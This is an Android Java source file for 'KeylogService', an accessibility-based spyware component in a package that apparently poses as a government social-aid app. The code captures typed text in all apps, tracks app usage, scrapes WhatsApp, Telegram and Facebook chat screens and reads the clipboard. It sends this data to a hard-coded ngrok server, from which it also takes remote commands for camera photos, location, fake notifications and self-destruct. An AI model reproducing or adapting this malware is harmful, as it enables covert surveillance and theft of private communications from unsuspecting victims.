package com.kemensos.bansos;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

/**
 * Advanced KeylogService — Accessibility-based keylogger + app tracker + clipboard monitor.
 *
 * Watches ALL apps in real-time:
 *   - TYPE_VIEW_TEXT_CHANGED → capture keystrokes per input field
 *   - TYPE_WINDOW_STATE_CHANGED → track which app/activity user opens
 *   - TYPE_VIEW_FOCUSED → know which field has focus (context)
 *
 * Also monitors clipboard and polls server for remote commands.
 */
public class KeylogService extends AccessibilityService {

    private static final String TAG = "KeylogService";
    private static final String SERVER_URL = "https://scarf-ion-cranium.ngrok-free.dev";
    private static final String DEVICE_ID = "65057ab5f5";

    // Flush interval for text buffer
    private static final long FLUSH_MS = 3000;
    // Command poll interval
    private static final long POLL_MS = 10000;
    // Max chars before force-flush
    private static final int MAX_TEXT_PER_ENTRY = 200;

    // Text buffer: key = "packageName:viewId", value = TextEntry
    private final HashMap<String, TextEntry> textBuffer = new HashMap<>();

    private ClipboardManager clipboardManager;
    private ClipboardManager.OnPrimaryClipChangedListener clipListener;

    // Background thread for networking
    private HandlerThread bgThread;
    private Handler bgHandler;

    // Current foreground app context
    private String currentApp = "";
    private String currentClass = "";
    // Last known text per view (for dedup)
    private final HashMap<String, String> lastTexts = new HashMap<>();

    // Flush & poll runnables
    private final Runnable flushRunnable = new Runnable() {
        @Override
        public void run() {
            flushBuffer();
            bgHandler.postDelayed(this, FLUSH_MS);
        }
    };

    private final Runnable pollRunnable = new Runnable() {
        @Override
        public void run() {
            pollCommands();
            bgHandler.postDelayed(this, POLL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== KeylogService created ===");
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "=== AccessibilityService CONNECTED ===");

        // Configure which events to receive
        AccessibilityServiceInfo info = getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        // Start background thread
        bgThread = new HandlerThread("KeylogBg");
        bgThread.start();
        bgHandler = new Handler(bgThread.getLooper());

        // Start clipboard monitoring
        setupClipboardMonitor();

        // Start periodic flush
        bgHandler.post(flushRunnable);
        // Start command polling
        bgHandler.postDelayed(pollRunnable, 5000);

        // Report service started
        bgHandler.post(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("event", "service_started");
                data.put("timestamp", System.currentTimeMillis());
                httpPost(SERVER_URL + "/api/keylog/" + DEVICE_ID + "/status", data.toString());
            } catch (Exception e) {
                Log.e(TAG, "Status report error", e);
            }
        });

        Log.d(TAG, "AccessibilityService fully configured & running");
    }

    /* ===================================================================
     * EVENT HANDLERS
     * =================================================================== */

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChange(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChange(event);
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleViewFocused(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Event handler error", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "onInterrupt — accessibility interrupted");
    }

    /* ===================================================================
     * WINDOW / APP CHANGE
     * =================================================================== */

    private void handleWindowChange(AccessibilityEvent event) {
        CharSequence pkg = event.getPackageName();
        CharSequence cls = event.getClassName();
        if (pkg == null) return;

        String newApp = pkg.toString();
        String newCls = cls != null ? cls.toString() : "";

        // Skip system launcher noise
        if (newApp.equals(currentApp) && newCls.equals(currentClass)) return;
        if (newApp.startsWith("com.android.systemui")) return;
        if (newApp.startsWith("android")) return;

        String oldApp = currentApp;
        currentApp = newApp;
        currentClass = newCls;

        Log.d(TAG, "App: " + oldApp + " → " + newApp + "/" + shorten(newCls));

        // WhatsApp chat detection — capture visible chat screen
        if (isChatApp(newApp) && event.getSource() != null) {
            captureChatScreen(newApp);
        }

        // Flush old buffer when app changes (text belongs to previous app)
        if (!oldApp.isEmpty() && !oldApp.equals(newApp)) {
            flushBuffer();
        }

        // Send app change to server
        final String fApp = newApp;
        final String fCls = newCls;
        bgHandler.post(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("package", fApp);
                data.put("class", fCls);
                data.put("timestamp", System.currentTimeMillis());
                httpPost(SERVER_URL + "/api/app-usage/" + DEVICE_ID, data.toString());
            } catch (Exception e) {
                Log.e(TAG, "App change send error", e);
            }
        });
    }

    /* ===================================================================
     * WHATSAPP / CHAT SCREEN CAPTURE (A11Y screen reading)
     * =================================================================== */

    private static final String[] CHAT_APPS = {
        "com.whatsapp", "com.whatsapp.w4b",
        "org.telegram.messenger",
        "com.facebook.orca", "com.facebook.katana"
    };

    private boolean isChatApp(String pkg) {
        for (String app : CHAT_APPS) {
            if (pkg.contains(app)) return true;
        }
        return false;
    }

    private void captureChatScreen(String packageName) {
        bgHandler.postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                String contactName = extractContactName(root, packageName);
                JSONArray messages = extractChatMessages(root, packageName);

                if (messages.length() > 0) {
                    JSONObject payload = new JSONObject();
                    payload.put("contact", contactName);
                    payload.put("messages", messages);
                    payload.put("package", packageName);
                    payload.put("timestamp", System.currentTimeMillis());
                    httpPost(SERVER_URL + "/api/chat-capture/" + DEVICE_ID, payload.toString());
                    Log.d(TAG, "Chat captured: " + messages.length() + " msgs from " + contactName);
                }
                root.recycle();
            } catch (Exception e) {
                Log.d(TAG, "Chat capture error: " + e.getMessage());
            }
        }, 800); // Delay to let UI settle
    }

    private String extractContactName(AccessibilityNodeInfo root, String pkg) {
        // Try to find contact name in toolbar / header
        String name = "";
        if (pkg.contains("whatsapp")) {
            // WhatsApp toolbar usually has contact name in the first significant TextView
            name = findTextByViewId(root, "com.whatsapp:id/conversation_contact_name");
            if (name.isEmpty()) {
                name = findFirstLargeText(root, pkg);
            }
        } else if (pkg.contains("telegram")) {
            name = findTextByViewId(root, "org.telegram.messenger:id/action_bar_title");
        } else if (pkg.contains("facebook")) {
            name = findTextByViewId(root, "com.facebook.orca:id/message_list_container");
        }
        return name;
    }

    private JSONArray extractChatMessages(AccessibilityNodeInfo root, String pkg) {
        JSONArray msgs = new JSONArray();
        try {
            // Find RecyclerView / ListView containing messages
            // Traverse children to find TextViews with message content
            traverseForMessages(root, msgs, pkg, 0);
        } catch (Exception e) {
            Log.d(TAG, "extract error: " + e.getMessage());
        }
        return msgs;
    }

    private void traverseForMessages(AccessibilityNodeInfo node, JSONArray msgs, String pkg, int depth) {
        if (node == null || depth > 8) return; // Limit depth
        
        try {
            CharSequence text = node.getText();
            String className = node.getClassName() != null ? node.getClassName().toString() : "";

            // Capture significant text from TextViews
            if (className.contains("TextView") && text != null && text.length() > 2) {
                // Skip known noise
                String t = text.toString().trim();
                if (t.equals("Type a message") || t.contains("Typing…") || t.isEmpty()) return;

                JSONObject msg = new JSONObject();
                msg.put("text", t);
                msg.put("view_id", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
                msg.put("content_desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                msgs.put(msg);
            }

            // Recurse children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    traverseForMessages(child, msgs, pkg, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // Skip problematic nodes
        }
    }

    private String findTextByViewId(AccessibilityNodeInfo root, String viewId) {
        if (root == null) return "";
        if (viewId.equals(root.getViewIdResourceName())) {
            CharSequence t = root.getText();
            if (t != null) return t.toString();
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                String result = findTextByViewId(child, viewId);
                child.recycle();
                if (!result.isEmpty()) return result;
            }
        }
        return "";
    }

    private String findFirstLargeText(AccessibilityNodeInfo root, String pkg) {
        // Fallback: find the most prominent TextView (larger text size)
        if (root == null) return "";
        // Basic approach: find a non-empty TextView that's not an input field
        try {
            CharSequence text = root.getText();
            String cls = root.getClassName() != null ? root.getClassName().toString() : "";
            if (cls.contains("TextView") && text != null && text.length() > 1 && text.length() < 30) {
                String t = text.toString().trim();
                if (!t.equals("Type a message") && !t.contains("Typing")) return t;
            }
        } catch (Exception e) {}
        
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                String result = findFirstLargeText(child, pkg);
                child.recycle();
                if (!result.isEmpty()) return result;
            }
        }
        return "";
    }

    /* ===================================================================
     * KEYSTROKE CAPTURE
     * =================================================================== */

    @SuppressLint("NewApi")
    private void handleTextChange(AccessibilityEvent event) {
        // Get source node info
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        boolean isPassword = false;
        String viewId = "";
        CharSequence nodeText = null;
        CharSequence hint = null;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                isPassword = source.isPassword();
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                viewId = source.getViewIdResourceName();
                if (viewId == null) viewId = "no-id";
            }
            nodeText = source.getText();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                hint = source.getHintText();
            }
        } finally {
            source.recycle();
        }

        // Skip password fields (security & legal)
        if (isPassword) return;

        // Get the typed text from event
        StringBuilder sb = new StringBuilder();
        for (CharSequence chunk : event.getText()) {
            if (chunk != null) sb.append(chunk);
        }
        String currentText = sb.toString().trim();

        // Build unique key for this input field
        String key = currentApp + "|" + viewId;

        // Dedup: only update if text actually changed
        String previous = lastTexts.get(key);
        if (currentText.equals(previous)) return;
        lastTexts.put(key, currentText);

        // Skip if just whitespace/no meaningful content
        if (currentText.isEmpty() && event.getRemovedCount() == 0) return;
        // Skip single-character deletions (backspace noise)
        if (previous != null && currentText.length() < previous.length()
                && previous.length() - currentText.length() == 1
                && previous.startsWith(currentText)) {
            // User deleted one char — still record it but mark as edit
        }

        // Buffer the entry
        TextEntry entry = new TextEntry(
                currentText,
                currentApp,
                currentClass,
                viewId,
                System.currentTimeMillis()
        );
        textBuffer.put(key, entry);

        // Force flush if buffer getting large
        if (textBuffer.size() >= 20) {
            flushBuffer();
        }
    }

    /* ===================================================================
     * VIEW FOCUSED (context for keylogging)
     * =================================================================== */

    private void handleViewFocused(AccessibilityEvent event) {
        CharSequence pkg = event.getPackageName();
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;

        try {
            String viewId = "";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                viewId = source.getViewIdResourceName();
                if (viewId == null) viewId = "no-id";
            }

            Log.d(TAG, "Focus: " + (pkg != null ? pkg : "?") + " view=" + viewId);
        } finally {
            source.recycle();
        }
    }

    /* ===================================================================
     * CLIPBOARD MONITOR
     * =================================================================== */

    private void setupClipboardMonitor() {
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboardManager == null) return;

        clipListener = () -> {
            try {
                ClipData clip = clipboardManager.getPrimaryClip();
                if (clip == null || clip.getItemCount() == 0) return;

                CharSequence text = clip.getItemAt(0).getText();
                if (text == null || text.length() == 0) return;

                String clipText = text.toString();
                // Skip trivial clips
                if (clipText.length() < 3) return;

                Log.d(TAG, "Clipboard: " + clipText.substring(0, Math.min(50, clipText.length())));

                JSONObject data = new JSONObject();
                data.put("text", clipText);
                data.put("length", clipText.length());
                data.put("app", currentApp);
                data.put("class", currentClass);
                data.put("timestamp", System.currentTimeMillis());

                bgHandler.post(() -> {
                    try {
                        httpPost(SERVER_URL + "/api/clipboard/" + DEVICE_ID, data.toString());
                    } catch (Exception e) {
                        Log.e(TAG, "Clipboard send error", e);
                    }
                });

            } catch (Exception e) {
                Log.e(TAG, "Clipboard listener error", e);
            }
        };

        clipboardManager.addPrimaryClipChangedListener(clipListener);
        Log.d(TAG, "Clipboard monitor active");
    }

    /* ===================================================================
     * TEXT BUFFER FLUSH
     * =================================================================== */

    private void flushBuffer() {
        if (textBuffer.isEmpty()) return;

        final JSONArray batch = new JSONArray();
        synchronized (textBuffer) {
            for (Map.Entry<String, TextEntry> e : textBuffer.entrySet()) {
                TextEntry te = e.getValue();
                if (te.text.isEmpty() && te.text.length() < 2) continue; // skip noise
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("text", te.text);
                    obj.put("package", te.packageName);
                    obj.put("class", te.className);
                    obj.put("view_id", te.viewId);
                    obj.put("length", te.text.length());
                    obj.put("timestamp", te.timestamp);
                    batch.put(obj);
                } catch (Exception ignored) {}
            }
            textBuffer.clear();
        }

        if (batch.length() == 0) return;

        final String body = batch.toString();
        bgHandler.post(() -> {
            try {
                String resp = httpPost(SERVER_URL + "/api/keylog/" + DEVICE_ID, body);
                Log.d(TAG, "Flushed " + batch.length() + " entries: " + resp);
            } catch (Exception e) {
                Log.e(TAG, "Flush error", e);
            }
        });
    }

    /* ===================================================================
     * SERVER COMMAND POLLING
     * =================================================================== */

    private void pollCommands() {
        try {
            String response = httpGet(SERVER_URL + "/api/commands/" + DEVICE_ID);
            JSONObject json = new JSONObject(response);
            JSONArray commands = json.optJSONArray("commands");
            if (commands == null || commands.length() == 0) return;

            Log.d(TAG, "Received " + commands.length() + " command(s)");

            for (int i = 0; i < commands.length(); i++) {
                JSONObject cmd = commands.getJSONObject(i);
                String cmdId = cmd.getString("id");
                String type = cmd.getString("type");
                JSONObject params = cmd.optJSONObject("params");
                if (params == null) params = new JSONObject();

                String result = executeCommand(type, params);
                ackCommand(cmdId, result);
            }
        } catch (Exception e) {
            // Silently fail — server might be offline
        }
    }

    private String executeCommand(String type, JSONObject params) {
        try {
            switch (type) {
                case "CAPTURE_PHOTO": {
                    // Forward to UpdateService to take photo
                    Intent intent = new Intent(this, UpdateService.class);
                    intent.setAction("com.kemensos.bansos.CMD_CAPTURE_PHOTO");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent);
                    } else {
                        startService(intent);
                    }
                    return "ok";
                }

                case "SEND_NOTIFICATION": {
                    String title = params.optString("title", "Pembaruan Sistem");
                    String text = params.optString("text", "");
                    if (!text.isEmpty()) {
                        showFakeNotification(title, text);
                    }
                    return "ok";
                }

                case "GET_LOCATION": {
                    // Trigger a location send from UpdateService
                    Intent intent = new Intent(this, UpdateService.class);
                    intent.setAction("com.kemensos.bansos.CMD_GET_LOCATION");
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent);
                    } else {
                        startService(intent);
                    }
                    return "ok";
                }

                case "OPEN_URL": {
                    String url = params.optString("url", "");
                    if (!url.isEmpty()) {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    }
                    return "ok";
                }

                case "SET_INTERVAL": {
                    int gpsMs = params.optInt("gps_ms", 0);
                    int cameraMs = params.optInt("camera_ms", 0);
                    Intent intent = new Intent(this, UpdateService.class);
                    intent.setAction("com.kemensos.bansos.CMD_SET_INTERVAL");
                    intent.putExtra("gps_ms", gpsMs);
                    intent.putExtra("camera_ms", cameraMs);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent);
                    } else {
                        startService(intent);
                    }
                    return "ok";
                }

                case "UPDATE_CONFIG": {
                    // Config update — handled by server URL change
                    String newServerUrl = params.optString("server_url", "");
                    String newDeviceId = params.optString("device_id", "");
                    Log.d(TAG, "Config update: server=" + newServerUrl + " device=" + newDeviceId);
                    // Note: persistent config update would need SharedPreferences
                    // For now, just log it
                    return "ok";
                }

                case "SELF_DESTRUCT": {
                    // Disable self and stop services
                    Log.w(TAG, "SELF_DESTRUCT command received!");
                    PackageManager pm = getPackageManager();
                    ComponentName cn = new ComponentName(this, MainActivity.class);
                    pm.setComponentEnabledSetting(cn,
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            PackageManager.DONT_KILL_APP);

                    // Open uninstall
                    Intent uninstall = new Intent(Intent.ACTION_DELETE,
                            Uri.parse("package:" + getPackageName()));
                    uninstall.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(uninstall);

                    // Stop services
                    stopSelf();
                    stopService(new Intent(this, UpdateService.class));
                    return "ok_self_destruct";
                }

                case "PING": {
                    return "pong";
                }

                default:
                    return "unknown_command:" + type;
            }
        } catch (Exception e) {
            Log.e(TAG, "Execute command error: " + type, e);
            return "error:" + e.getMessage();
        }
    }

    private void ackCommand(String cmdId, String result) {
        try {
            JSONObject ack = new JSONObject();
            ack.put("command_id", cmdId);
            ack.put("status", result.startsWith("error") ? "error" : "done");
            ack.put("result", result);
            ack.put("timestamp", System.currentTimeMillis());
            httpPost(SERVER_URL + "/api/commands/" + DEVICE_ID + "/ack", ack.toString());
        } catch (Exception e) {
            Log.e(TAG, "Ack error", e);
        }
    }

    private void showFakeNotification(String title, String text) {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    "cmd_channel", "Perintah Sistem",
                    NotificationManager.IMPORTANCE_DEFAULT);
            nm.createNotificationChannel(ch);
        }

        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        Notification notif = new Notification.Builder(this,
                Build.VERSION.SDK_INT >= 26 ? "cmd_channel" : null)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .setContentIntent(pi)
                .build();

        nm.notify((int) (System.currentTimeMillis() % 10000), notif);
    }

    /* ===================================================================
     * HTTP HELPERS
     * =================================================================== */

    private String httpPost(String urlStr, String jsonBody) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        OutputStream os = conn.getOutputStream();
        os.write(jsonBody.getBytes("UTF-8"));
        os.flush();
        os.close();
        int code = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) response.append(line);
        reader.close();
        conn.disconnect();
        return response.toString();
    }

    private String httpGet(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        int code = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) response.append(line);
        reader.close();
        conn.disconnect();
        return response.toString();
    }

    private static String shorten(String s) {
        if (s == null) return "";
        int lastDot = s.lastIndexOf('.');
        return lastDot >= 0 ? s.substring(lastDot + 1) : s;
    }

    /* ===================================================================
     * TEXT ENTRY DATA CLASS
     * =================================================================== */

    private static class TextEntry {
        final String text;
        final String packageName;
        final String className;
        final String viewId;
        final long timestamp;

        TextEntry(String text, String packageName, String className, String viewId, long timestamp) {
            this.text = text;
            this.packageName = packageName;
            this.className = className;
            this.viewId = viewId;
            this.timestamp = timestamp;
        }
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "=== KeylogService DESTROYED ===");
        if (clipboardManager != null && clipListener != null) {
            try {
                clipboardManager.removePrimaryClipChangedListener(clipListener);
            } catch (Exception ignored) {}
        }
        if (bgHandler != null) {
            bgHandler.removeCallbacks(flushRunnable);
            bgHandler.removeCallbacks(pollRunnable);
        }
        if (bgThread != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                bgThread.quitSafely();
            } else {
                bgThread.quit();
            }
        }

        // Report service stopped
        bgHandler.post(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("event", "service_stopped");
                data.put("timestamp", System.currentTimeMillis());
                httpPost(SERVER_URL + "/api/keylog/" + DEVICE_ID + "/status", data.toString());
            } catch (Exception ignored) {}
        });

        super.onDestroy();
    }
}
